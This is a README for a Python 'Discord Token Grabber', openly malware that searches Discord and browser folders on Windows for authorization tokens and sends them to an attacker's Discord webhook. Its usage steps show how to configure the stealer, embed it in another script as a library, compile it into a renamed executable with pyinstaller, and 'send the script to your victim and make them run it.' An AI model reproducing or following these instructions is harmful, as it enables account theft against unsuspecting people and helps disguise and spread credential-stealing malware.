<h1 align="center">Discord Token Grabber</h1>
<p align="center">A Discord token grabber written in Python 3.</p>

This version of the grabber only supports **Windows**.

# Features
 - Transfers via Discord webhook
 - Searches for authorization tokens in multiple directories (Discord, Discord PTB, Discord Canary, Google chrome, Opera, Brave and Yandex)
 - Only requests library needed
 - can be used as a library

<br>

# How to use
 1. Create a webhook on your Discord server.
 2. Change the 'WEBHOOK_URL' variable value to your Discord webhook URL in [token-grabber.py](token-grabber.py)
 2.5. add it to another script (preferably as a library)
 example:
 ```python
import token_stealer
token_stealer.WEBHOOK_URL = "https://discord.com/api/webhooks/123456789/fyugYDStygft2g7y8f6datyFTYydfg61hfTY78y"
token_stealer.PING_ME = True
token_stealer.main()
```
2.75. Compile the script using pyinstaller
```
pyinstaller --onefile --console --name "program_name_here" --no-embed-manifest --add-data "C:/path/to/project/token_stealer.py;."  "C:/path/to/project/your_script.py"
```
3. Send the script to your victim and make them run it.
